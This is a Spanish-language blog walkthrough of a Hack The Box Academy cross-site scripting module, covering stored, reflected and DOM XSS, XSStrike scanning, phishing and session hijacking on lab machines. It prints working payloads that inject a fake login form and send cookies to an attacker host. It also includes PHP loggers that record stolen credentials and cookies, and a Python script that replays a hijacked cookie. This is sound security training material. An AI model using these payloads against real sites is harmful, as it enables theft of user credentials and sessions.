---
layout: post
title: "Walkthrough: Cross-Site Scripting (XSS) "
date:  24-02-2026
categories: [Walkthroughs, HTB Academy]
tags: [XSS Stored,XXS reflected,XSS DOM, XSStrike, XSS Phishing Attack, Session Hijacking]
image: "assets/images/HTB_Academy_XSS/featured_image.png"
alt: portada de Walkthrough Cross-Site Scripting (XSS) 
---

## Conceptos Basicos de XSS

### XSS almacenado

Para obtener la bandera, use la misma carga útil que usamos anteriormente, pero cambie su código JavaScript para mostrar la cookie en lugar de mostrar la URL.

94.237.54.190:31287

![alt text](../assets/images/HTB_Academy_XSS/image.png)

![alt text](../assets/images/HTB_Academy_XSS/image-1.png)

![alt text](../assets/images/HTB_Academy_XSS/image-2.png)

```html
<script>alert(window.origin)</script>
```

![alt text](../assets/images/HTB_Academy_XSS/image-3.png)

```html
<script>alert(document.cookie);</script>
```

![alt text](../assets/images/HTB_Academy_XSS/image-4.png)

### XSS reflejado

Para obtener la bandera, use la misma carga útil que usamos anteriormente, pero cambie su código JavaScript para mostrar la cookie en lugar de mostrar la URL.

94.237.52.168:35871

![alt text](../assets/images/HTB_Academy_XSS/image-5.png)

![alt text](../assets/images/HTB_Academy_XSS/image-6.png)

![alt text](../assets/images/HTB_Academy_XSS/image-7.png)

```html
<script>alert(window.origin)</script>
```

![alt text](../assets/images/HTB_Academy_XSS/image-8.png)

test

http://94.237.52.168:35871/index.php?task=test

```sh
http://94.237.52.168:35871/index.php?task=<script>alert(document.cookie);</script>
```

![alt text](../assets/images/HTB_Academy_XSS/image-9.png)

```sh
http://94.237.52.168:35871/index.php?task=<script>alert(document.cookie);</script>
```

![alt text](../assets/images/HTB_Academy_XSS/image-10.png)


### DOM XSS

Para obtener la bandera, use la misma carga útil que usamos anteriormente, pero cambie su código JavaScript para mostrar la cookie en lugar de mostrar la URL.

94.237.54.190:59275

![alt text](../assets/images/HTB_Academy_XSS/image-11.png)

![alt text](../assets/images/HTB_Academy_XSS/image-12.png)

![alt text](../assets/images/HTB_Academy_XSS/image-13.png)



![alt text](../assets/images/HTB_Academy_XSS/image-14.png)

```sh
http://94.237.54.190:59275/#task=test
```

We see that the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter that is completely processed on the browser. 
This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end; hence it is a DOM-based XSS.

![alt text](../assets/images/HTB_Academy_XSS/image-15.png)

Recargo la web para ver los scripts que se cargan

![alt text](../assets/images/HTB_Academy_XSS/image-16.png)

![alt text](../assets/images/HTB_Academy_XSS/image-17.png)

![alt text](../assets/images/HTB_Academy_XSS/image-18.png)


```html
<img src="" onerror=alert(document.cookie)>
```

![alt text](../assets/images/HTB_Academy_XSS/image-19.png)

### Descubrimiento XSS

Utilice algunas de las técnicas mencionadas en esta sección para identificar el parámetro de entrada vulnerable que se encuentra en el servidor mencionado anteriormente. ¿Cuál es el nombre del parámetro vulnerable?

94.237.54.190:48160

![alt text](../assets/images/HTB_Academy_XSS/image-20.png)

```sh
git clone https://github.com/s0md3v/XSStrike.git
```

![alt text](../assets/images/HTB_Academy_XSS/image-21.png)

```
cd XSStrike
pip install -r requirements.txt
```

![alt text](../assets/images/HTB_Academy_XSS/image-22.png)


```sh
python xsstrike.py
```

![alt text](../assets/images/HTB_Academy_XSS/image-23.png)


![alt text](../assets/images/HTB_Academy_XSS/image-24.png)

![alt text](../assets/images/HTB_Academy_XSS/image-25.png)

```sh
http://94.237.54.190:48160/?fullname=iblazquez&username=ibl4zquez&password=123456&email=ibl4zqu3z%40mail.com
```

![alt text](../assets/images/HTB_Academy_XSS/image-26.png)

```sh
python xsstrike.py -u "http://94.237.54.190:48160/?fullname=test&username=test&password=test&email=test%40mail.com" 
```

![alt text](../assets/images/HTB_Academy_XSS/image-27.png)


¿Qué tipo de XSS se encontró en el servidor mencionado anteriormente? "solo nombre"

la respuesta aparece en la imagen anterior

## Ataques XSS

### Suplantación de identidad (phishing)


Intenta encontrar una carga útil XSS que funcione para el formulario de URL de imagen que se encuentra en '/phishing' en el servidor mencionado anteriormente y luego usa lo que aprendiste en esta sección para preparar una URL maliciosa que inyecte un formulario de inicio de sesión malicioso. Luego visita '/phishing/send.php' para enviar la URL a la víctima, y esta iniciará sesión en el formulario de inicio de sesión malicioso. Si hiciste todo correctamente, deberías recibir las credenciales de inicio de sesión de la víctima, que puedes usar para iniciar sesión en '/phishing/login.php' y obtener la bandera.


10.129.227.72

![alt text](../assets/images/HTB_Academy_XSS/image-28.png)

![alt text](../assets/images/HTB_Academy_XSS/image-29.png)

```sh
https://www.hackthebox.eu/images/logo-htb.svg
```

![alt text](../assets/images/HTB_Academy_XSS/image-30.png)

```html
<script>alert(window.origin)</script>
```

![alt text](../assets/images/HTB_Academy_XSS/image-31.png)

```sh
python xsstrike.py -u "http://10.129.227.72/phishing/index.php?url=test"
```


![alt text](../assets/images/HTB_Academy_XSS/image-32.png)

![alt text](../assets/images/HTB_Academy_XSS/image-33.png)

```html
<h3>Please login to continue</h3>
<form action=http://10.10.15.192>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

```js
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.192:8000><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

![alt text](../assets/images/HTB_Academy_XSS/image-34.png)

```sh
http://10.129.227.72/phishing/index.php?url=document.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.15.192%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3B
```



Preparo mi servidor

```sh
mkdir /tmp/tmpserver
cd /tmp/tmpserver
touch index.php
```

Con nano index.php escribo el siguiente codigo en el fichero index.php

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.227.72/phishing/login.php");
    fclose($file);
    exit();
}
?>
```

![alt text](../assets/images/HTB_Academy_XSS/image-35.png)

Levanto el servidor

```sh
sudo php -S 0.0.0.0:8000
```

![alt text](../assets/images/HTB_Academy_XSS/image-38.png)


![alt text](../assets/images/HTB_Academy_XSS/image-39.png)


![alt text](../assets/images/HTB_Academy_XSS/image-40.png)

Now that we have a server ready, just put the url in /send.php and wait for the credentials

![alt text](../assets/images/HTB_Academy_XSS/image-43.png)

![alt text](../assets/images/HTB_Academy_XSS/image-44.png)

![alt text](../assets/images/HTB_Academy_XSS/image-45.png)



### Secuestro de sesión
Intente repetir lo que aprendió en esta sección para identificar el campo de entrada vulnerable y encontrar una carga útil XSS que funcione, y luego use los scripts 'Session Hijacking' para obtener la cookie del administrador y usarla en 'login.php' para obtener la bandera.



10.129.151.6

![alt text](../assets/images/HTB_Academy_XSS/image-49.png)

![alt text](../assets/images/HTB_Academy_XSS/image-50.png)

```sh
gobuster dir -u http://10.129.151.6 -w /usr/share/seclists/Discovery/Web-Content/common.txt -q
```

![alt text](../assets/images/HTB_Academy_XSS/image-51.png)

```sh
gobuster dir -u http://10.129.151.6 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -q
```

![alt text](../assets/images/HTB_Academy_XSS/image-52.png)

![alt text](../assets/images/HTB_Academy_XSS/image-53.png)


![alt text](../assets/images/HTB_Academy_XSS/image-54.png)

![alt text](../assets/images/HTB_Academy_XSS/image-55.png)

```sh
http://10.129.151.6/hijacking/?fullname=name&username=username&password=password&email=email%40email.com&imgurl=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F149118742%3Fv%3D4
```

```sh
git clone https://github.com/s0md3v/XSStrike.git
```

![alt text](../assets/images/HTB_Academy_XSS/image-56.png)

```sh
cd XSStrike/
pip install -r requirements.txt
```

![alt text](../assets/images/HTB_Academy_XSS/image-57.png)

```sh
python xsstrike.py -u "http://10.129.151.6/hijacking/?fullname=name&username=username&password=password&email=email%40email.com&imgurl=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F149118742%3Fv%3D4"
```

![alt text](../assets/images/HTB_Academy_XSS/image-58.png)

No se detectan Vulnerabilidades DOM o Reflected.

Creare un script que guarde la cookie

```sh
mkdir /tmp/tmpserver
cd /tmp/tmpserver
touch index.php
nano index.php
```


```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

![alt text](../assets/images/HTB_Academy_XSS/image-60.png)

Compruebo mi IP de la maquina atacante

![alt text](../assets/images/HTB_Academy_XSS/image-59.png)

Hago un script de Javascript que se llamara script.js 
```sh
touch script.js
nano script.js
```

y contiene la siguiente linea:

```js
new Image().src='http://10.10.15.192:8080/index.php?c='+document.cookie;
```

![alt text](../assets/images/HTB_Academy_XSS/image-63.png)

La carpeta del servidor atacante contiene estos ficheros.

![alt text](../assets/images/HTB_Academy_XSS/image-62.png)

Levanto el servidor PHP

```sh
sudo php -S 0.0.0.0:8080
```

![alt text](../assets/images/HTB_Academy_XSS/image-64.png)

Ahora compruebo cada uno de los campos con el contenido:

```html
"><script src=http://10.10.15.192:8080/script.js></script>
```

![alt text](../assets/images/HTB_Academy_XSS/image-65.png)

Y al pulsar en registro en el servidor malicioso obtendre las respuestas

![alt text](../assets/images/HTB_Academy_XSS/image-66.png)

Ahora que tengo la cookie accedo a la pagina que me indica la pregunta `login.php`

![alt text](../assets/images/HTB_Academy_XSS/image-67.png)

Y tengo que usar la cookie secuestrada.

#### Metodo 1: Usando herramientas de desarrollo web del navegador

Accedo a Storage e inspecciono las cookies de la pagina

![alt text](../assets/images/HTB_Academy_XSS/image-68.png)

![alt text](../assets/images/HTB_Academy_XSS/image-69.png)

Modifico nombre y valor de la cookie

![alt text](../assets/images/HTB_Academy_XSS/image-70.png)

Refresco la pagina para que se cargue el valor de cookie secuestrada y me de acceso al panel de administrador.

![alt text](../assets/images/HTB_Academy_XSS/image-71.png)

He obtenido la flag del ejerecicio.

#### Metodo 2: Script python

Creo un script en python al cual le doy como entrada el nombre de la cookie, el valor de la cookie, y la url donde atacar.

```sh
touch cookie_monster.py
nano cookie_monster.py
```

El codigo del script es el siguiente:

```py
import requests
from urllib.parse import urlparse

# Solicitar al usuario el nombre y el valor de la cookie
cookie_name = input("Ingrese el nombre de la cookie: ")
cookie_value = input("Ingrese el valor de la cookie: ")

# Solicitar al usuario la URL
url = input("Ingrese la URL (por ejemplo, http://IP_OBJETIVO/hijacking/login.php): ")

# Extraer el host a partir de la URL
parsed_url = urlparse(url)
host = parsed_url.netloc

# Construir los headers adaptados
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "pt-BR,pt",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Cookie": f"{cookie_name}={cookie_value}",
    "Host": host,
    "Sec-GPC": "1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
}

# Realizar la petición GET
response = requests.get(url, headers=headers)

# Mostrar el contenido de la respuesta
print(response.text)
```

![alt text](../assets/images/HTB_Academy_XSS/image-74.png)

## Evaluacion de habilidades

We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new Security Blog. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).

Start the server below, make sure you are connected to the VPN, and access the /assessment directory on the server using the browser:

![alt text](../assets/images/HTB_Academy_XSS/image-75.png)

Tasks:

- Identify a user-input field that is vulnerable to an XSS vulnerability
- Find a working XSS payload that executes JavaScript code on the target's browser
- Using the Session Hijacking techniques, try to steal the victim's cookies, which should contain the flag

What is the value of the 'flag' cookie?

Objetivo: 
10.129.151.6

Compruebo conectividad:

```sh
ping -c2 10.129.151.6
```

![alt text](../assets/images/HTB_Academy_XSS/image-76.png)

```sh
nmap -p- 10.129.151.6
```

![alt text](../assets/images/HTB_Academy_XSS/image-77.png)

![alt text](../assets/images/HTB_Academy_XSS/image-78.png)

gobuster dir -u http://10.129.151.6/assessment -w /usr/share/seclists/Discovery/Web-Content/common.txt -q

![alt text](../assets/images/HTB_Academy_XSS/image-79.png)

![alt text](../assets/images/HTB_Academy_XSS/image-80.png)

Dejare un comentario para ver como funciona el formulario de comentarios.

![alt text](../assets/images/HTB_Academy_XSS/image-81.png)

Voy a crear un servidor malicioso para capturar las cookies de sesion que se usen

Creo la carpeta `/tmp/tmpserver` y me posiciono en ella

```sh
mkdir /tmp/tmpserver && cd /tmp/tmpserver
```

![alt text](../assets/images/HTB_Academy_XSS/image-82.png)

```sh
touch script.js && nano script.js
```

Escribo el contenido siguiente:

```js
document.location='http://10.10.15.192:8080/index.php?c='+document.cookie;
```

![alt text](../assets/images/HTB_Academy_XSS/image-89.png)

Creo un fichero index.php

```sh
touch index.php && nano index.php
```

En el fichero `index.php` creo el siguiente codigo

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Este código PHP realiza lo siguiente:

1. Verifica la existencia de un parámetro GET llamado "c":
Se comprueba si $_GET['c'] está definido. Esto significa que el script solo actúa si se ha pasado un parámetro "c" en la URL.

2. Divide el contenido del parámetro "c":
Utiliza la función explode(";", $_GET['c']) para separar el valor del parámetro en varios elementos utilizando el carácter punto y coma (;) como delimitador. Esto es útil en caso de que se envíen múltiples valores concatenados.

3. Procesa cada elemento de la lista:
Recorre cada valor resultante:
    
    3.1. Decodifica la URL: Se aplica urldecode() para convertir cualquier codificación URL a su formato legible, obteniendo el valor real de la cookie u otro dato.
    
    3.2. Abre (o crea) un archivo de registro: Abre el archivo cookies.txt en modo "a+" (apéndice y lectura). Esto permite que se añadan nuevos datos sin borrar los existentes.
    
    3.3 Escribe la información en el archivo: Mediante fputs(), escribe una línea que incluye la dirección IP de la víctima (obtenida de $_SERVER['REMOTE_ADDR']) y el valor decodificado.
    
    3.4 Cierra el archivo: Se utiliza fclose() para liberar el recurso del archivo después de escribir.

![alt text](../assets/images/HTB_Academy_XSS/image-87.png)

Ahora que tengo la carpeta con los archivos maliciosos necesarios

![alt text](../assets/images/HTB_Academy_XSS/image-88.png)

Levanto un servidor php malicioso en mi maquina atacante.

```sh
sudo php -S 0.0.0.0:8080
```

![alt text](../assets/images/HTB_Academy_XSS/image-90.png)

Ahora compruebo cada uno de los campos con el contenido:

```html
"><script src=http://10.10.15.192:8080/script.js></script>
```

![alt text](../assets/images/HTB_Academy_XSS/image-91.png)

Al completarse el script del comentario en el servidor malicioso obtengo las respuestas

![alt text](../assets/images/HTB_Academy_XSS/image-92.png)

He obtenido la flag del ejercicio.

